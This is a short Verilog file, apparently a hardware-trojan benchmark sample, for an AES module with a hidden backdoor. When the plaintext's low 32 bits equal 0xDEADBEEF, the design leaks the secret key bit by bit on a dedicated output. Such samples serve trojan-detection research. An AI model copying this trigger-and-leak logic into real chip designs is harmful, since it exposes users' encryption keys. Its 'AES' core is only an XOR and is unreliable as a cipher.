// AES-T100: Trojan-infected AES module
// Trojan: Leaks key when specific plaintext pattern detected

module aes_cipher_top_trojan(
    input clk,
    input rst,
    input [127:0] plaintext,
    input [127:0] key,
    output reg [127:0] ciphertext,
    output reg done,
    output reg trojan_leak  // Trojan payload output
);

    // Normal AES registers
    reg [127:0] state;
    reg [3:0] round;

    // Trojan trigger: rare input pattern
    wire trojan_trigger;
    assign trojan_trigger = (plaintext[31:0] == 32'hDEADBEEF);

    // Trojan FSM counter
    reg [7:0] Trojan_Trigger_Counter;

    always @(posedge clk or posedge rst) begin
        if (rst) begin
            state <= 128'b0;
            round <= 4'b0;
            done <= 1'b0;
            Trojan_Trigger_Counter <= 8'b0;
            trojan_leak <= 1'b0;
        end else begin
            // Normal AES operation (simplified)
            state <= plaintext ^ key;
            round <= round + 1;

            if (round == 4'd10) begin
                ciphertext <= state;
                done <= 1'b1;
            end

            // Trojan payload: leak key bit by bit
            if (trojan_trigger) begin
                Trojan_Trigger_Counter <= Trojan_Trigger_Counter + 1;
                trojan_leak <= key[Trojan_Trigger_Counter[6:0]];
            end
        end
    end

endmodule
